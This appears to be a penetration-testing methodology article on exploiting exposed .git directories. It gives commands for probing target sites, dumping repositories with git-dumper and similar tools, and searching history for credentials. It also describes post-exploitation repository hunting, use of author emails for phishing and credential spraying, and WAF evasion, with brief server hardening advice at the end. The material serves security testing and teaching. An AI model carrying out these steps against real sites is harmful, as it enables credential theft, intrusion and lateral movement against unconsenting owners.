---
title: "Exposed .git Repositories: Pre- and Post-Exploitation Extraction"
description: "How exposed .git directories lead to full source recovery, secrets in history, and internal intel. Covers detection, dumping, reconstruction, and local post-exploitation extraction with concrete commands."
category: "Method"
tags: [".git", "Git", "Recon", "Post-Exploitation", "Secrets", "Source Recovery"]
featured: false
date: "2026-10-05"
---

> An exposed `.git` folder is often more valuable than a single vulnerability. It gives you the entire development history — including mistakes developers thought they erased.

## The question

How can an exposed `.git` directory be leveraged during both pre-exploitation (external web recon) and post-exploitation (local host access), and what concrete techniques/commands actually work to extract usable intelligence?

## The target model

A `.git` directory contains version control metadata: object database (blobs/trees/commits), refs (branches/tags), HEAD, config, index, packed-refs, logs, and more. When misconfigured web servers serve `.git/` (or when found locally on compromised hosts), this metadata allows reconstruction of the full working tree and history — often revealing deleted files, hardcoded secrets, internal hostnames, and deployment details.

- **Actors**: External attacker with HTTP access to a web root; internal attacker/post-exploiter with file system access on a compromised host.
- **Assets**: Source code, commit history, diffs, stashes/reflogs, .git/config remotes, CI configs, credentials in old commits.
- **Surface**: Misconfigured web server (directory listing or direct file access to .git/*), forgotten dev dirs, internal file shares, leftover repos on web roots/CI paths/backups.

## The surface criteria

| Criterion | Question it answers |
| --- | --- |
| **Reachable** | Can we access `.git/HEAD`, `.git/config`, or objects? (HTTP or filesystem) |
| **Translates** | Does metadata allow reconstructing objects/commits/files? |
| **Brokers trust** | Do recovered secrets/URLs point to internal systems we can pivot to? |
| **Holds authority** | Do we find API keys, tokens, private keys, or creds enabling access? |

**Prioritization**: Focus on complete object recovery first (enables full tree/history), then secret scanning across history (not just working tree).

## The inventory

| Element | Purpose | Talks to | Trust boundary | Fails into |
| --- | --- | --- | --- | --- |
| `.git/HEAD` | Points to current branch ref | Refs | Metadata | Confirms repo state, guides ref traversal |
| `.git/config` | Remote URLs, branches, repo config | Internal git hosts | Auth/config | Reveals internal remotes, sometimes embedded creds |
| `.git/index` | Staging area (file paths/modes/hashes) | Objects | Content index | Lets you enumerate files even if listing disabled |
| `.git/refs/` | Branch/tag pointers to commit hashes | Commits/objects | Ref boundary | Maps history start points |
| `.git/logs/` | Reflogs (local history of ref updates) | Refs/commits | Local history | Recovers branches/commits not in refs |
| `.git/packed-refs` | Packed refs for efficiency | Commits | Ref store | Alternative ref source |
| `.git/objects/` | Loose objects (aa/bb... content) + packs | Everything | Object DB | Core: blobs/trees/commits needed to reconstruct files |
| `.git/info/` | Repo metadata (exclude, etc.) | — | Local | Occasionally useful hints |
| Stashes | WIP commits | Objects | Local state | May contain sensitive work-in-progress |

## From element to vector

### Scenario A: Pre-exploitation (exposed .git over HTTP)

1. **Actor**: External attacker with web access  
2. **Precondition**: `.git/` reachable (direct file access or partial listing)  
3. **Primitive**: Download repo metadata + objects → reconstruct full source/history  
4. **Consequence**: Access deleted files, secrets in old commits, internal paths/URLs  
5. **Objective**: Leaked credentials → access; source insight → further vulns/pivots

### Scenario B: Post-exploitation (local .git)

1. **Actor**: Compromised host user/privileged access  
2. **Precondition**: Found `.git/` dirs on filesystem (web roots, home, CI, backups)  
3. **Primitive**: Read full history, reflogs, stashes, config  
4. **Consequence**: Extract creds, internal infra, developer intel for lateral movement/phishing  
5. **Objective**: Expand access, persistence intel, credential reuse

**Rejected candidates:**
> **Rejected:** Blind scraping without validating object integrity — fails on *primitive*: partial dumps produce corrupted trees; validate with `git fsck`.  
> **Rejected:** Relying only on working tree after `git checkout` — fails on *objective*: deleted files/secrets live in history/diffs/stashes, not just HEAD.  
> **Rejected:** Brute-forcing arbitrary hashes at scale blindly — fails on *cost*: inefficient vs extracting index/packed-refs/logs to enumerate known hashes.

> **Plain terms**  
> The `.git` folder is a ledger. If you only read the current page (working tree), you miss redacted lines in older pages (history). The win is in recovering those older pages and scanning them.

## Execution

### Scenario A: Pre-exploitation — Exposed .git over HTTP

#### Detection
Check common endpoints:
```bash
curl -I https://target.tld/.git/HEAD
curl -s https://target.tld/.git/config
curl -s https://target.tld/.git/index | head -c 100
```
Signs: HTTP 200 for `.git/HEAD` (usually contains `ref: refs/heads/main` or `master`), readable config/index. Directory listing enabled is a big indicator.

#### Automated dumping (recommended)

- **[git-dumper](https://github.com/arthaud/git-dumper)**: Reliable for partial/obfuscated .git exposures. Dumps objects/refs while handling directory listing quirks.
```bash
pip install git-dumper
git-dumper https://target.tld/ ./dump/
```
- **[GitTools](https://github.com/internetwache/GitTools)**: `gitdumper.sh` (downloads), `extractor.sh` (reconstructs). Good when objects are accessible but structure incomplete.
```bash
./GitTools/Dumper/gitdumper.sh https://target.tld/.git/ ./dump
./GitTools/Extractor/extractor.sh ./dump ./repo
```
- **[dvcs-ripper](https://github.com/kost/dvcs-ripper)**: Rip CVS/SVN/Git/Mercurial; useful for tricky cases.
```bash
perl rip-git.pl -v -u https://target.tld/.git/
```

#### Manual reconstruction when directory listing is disabled
Common trick: `.git/index` lists all tracked files with their SHA-1 hashes (even without listing). Also `.git/packed-refs`, `.git/refs/heads/*`, `.git/refs/tags/*`, `.git/logs/HEAD` reveal commit hashes.

Workflow:
1. Download critical files: `/.git/HEAD`, `/.git/index`, `/.git/config`, `/.git/packed-refs`, and any refs/logs you can reach (`/.git/refs/heads/*`, `/.git/logs/HEAD`).
2. Parse `.git/index` to enumerate file paths + blob hashes (useful to know which objects must exist).
3. Attempt to fetch loose objects: `.git/objects/aa/bbcc...` where `aa` = first 2 hex chars, `bbcc...` = rest (40 hex total). Try common paths.
4. Download packs if present: `.git/objects/pack/pack-*.pack` and `.idx`.
5. Reconstruct: once objects+refs recovered, run `git` in the dumped dir (`git log --all`, `git branch -a`, `git checkout .`).

#### Common pitfalls
- Partial dumps (missing packs/objects) → `git fsck --full` shows dangling/unreachable; recover via logs/reflogs/packed-refs.
- Corrupted objects/packs → try alternative tools; sometimes manual fetch of missing hashes needed.
- Rate limiting or WAF blocking .git paths → use stealth headers, throttling, or case variations (rare). Focus on what’s actually reachable.

### Scenario B: Post-exploitation — Local .git repos

#### Locate repos
```bash
# Find all .git directories
find / -name ".git" -type d 2>/dev/null

# Common locations
ls -la /var/www/html/.git 2>/dev/null
ls -la /home/*/.git 2>/dev/null
ls -la /opt/*/.git /srv/*/.git /var/lib/*/.git 2>/dev/null
find / -path "*ci*\.git" -not -path "*/node_modules/*" 2>/dev/null
```

#### Extract secrets and history
```bash
cd /path/to/repo
git log --oneline -10
git log -p --max-count=5        # full diffs of recent commits
git log --all --full-history -- <sensitive-file>
git blame <file>                # who changed what
```
Search diffs for patterns: API keys, tokens, passwords, private keys, connection strings, AWS/GCP/Azure creds, JWTs.

#### Recover deleted files/branches, reflogs, stashes
```bash
git reflog                     # history of HEAD movements (recovers lost commits)
git stash list                 # stashed work-in-progress
git stash show -p stash@{0}    # inspect stash diffs

# Find unreachable/dangling objects
git fsck --unreachable --no-reflogs
git fsck --lost-found

# Recover dangling blobs/commits if needed
# git show <dangling-sha>
```

#### Secret scanning tools (history-aware)
```bash
# TruffleHog (deep history scanning)
trufflehog git file:///path/to/repo --only-verified

# Gitleaks (fast regex-based)
gitleaks detect -v --source /path/to/repo

# git-secrets (pre-commit style, also scan history)
git secrets --scan-history
```

#### Review config, remotes, CI
```bash
cat .git/config
git remote -v
# Check CI/CD configs
cat .gitlab-ci.yml .github/workflows/*.yml 2>/dev/null
cat azure-pipelines.yml Jenkinsfile 2>/dev/null
```
Look for embedded creds in remote URLs (`https://user:pass@internal.git/...`) or secrets in CI variables referenced.

## What to extract (checklist)
- **Secrets**: API keys, access tokens, passwords, private keys (SSH/SSL), service account creds
- **Infra**: Internal hostnames, IPs, domains, VPN ranges, internal git/registry URLs
- **Configs**: `.env`, config files committed then removed, DB connection strings
- **Code intel**: Auth logic, endpoints, business rules (useful for further attacks)
- **Identity**: Author emails/usernames (phishing, credential spraying correlation)
- **CI/CD**: Pipeline configs revealing deployment secrets, internal systems, build paths
- **Operational**: Backup paths, deployment scripts, test data with real info

## Practical workflow example

1. **Discover**: `curl -I http://target.example/.git/HEAD` → 200 OK, shows `ref: refs/heads/master`
2. **Dump**: `git-dumper http://target.example/ ./dump/` → downloads objects/refs/index/config
3. **Reconstruct**: `cd dump && git log --oneline --all -5` → see commit history; `git branch -a`
4. **Explore**: `git checkout master 2>/dev/null; ls -la` → full working tree recovered
5. **Find secrets**: `git log -p --all | grep -iE 'api[_-]?key|password|token|secret|private[_-]?key' | head -20`
6. **Dig deeper**: `gitleaks detect --source . -v` or `trufflehog git file://$(pwd)` across full history
7. **Pivot**: From `.git/config` or diffs, extract internal hostnames/creds → validate for lateral movement (with authorization)

## Defensive notes (brief)

- Block `.git/` access at web server (nginx `location ~ /\.git { deny all; }`, Apache `RedirectMatch 404 /\.git`, or disable directory indexing + don't serve dotdirs).
- Treat secrets as compromised if ever committed; rotate immediately. Use history rewriting (BFG Repo-Cleaner) or `git filter-repo` to purge, then force-push with care.
- Enforce `.gitignore`, pre-commit hooks (`gitleaks`, `git-secrets`, `trufflehog`), secret scanning in CI (push protection), and prevent direct `.git` exposure in all environments (dev/staging/prod).
- Never embed credentials in remote URLs; use deploy keys, tokens, or Git credential helpers.

## Closing

Whether external or post-exploitation, `.git` artifacts are low-hanging loot that often yields high-value intel. The methodology is consistent: verify reachability, recover full object graph (don't stop at HEAD), then mine history (reflogs/stashes/diffs) for secrets and infrastructure references. Treat version control history as part of your recon/loot surface — enumerate it thoroughly and methodically.

## Glossary

- **Loose object**: Git object stored as individual file `objects/aa/bbbb...`
- **Packfile (.pack/.idx)**: Compressed/deltified objects for efficiency
- **Ref**: Pointer to commit (branches/tags/HEAD)
- **Reflog**: Local log of ref updates (survives resets in local repo)
- **Dangling object**: Unreachable commit/blob/tree (can be from amended/rebased/deleted refs)
- **Working tree**: Current checked-out files
- **Index**: Staging area; contains tracked file hashes/paths even if files deleted in working tree
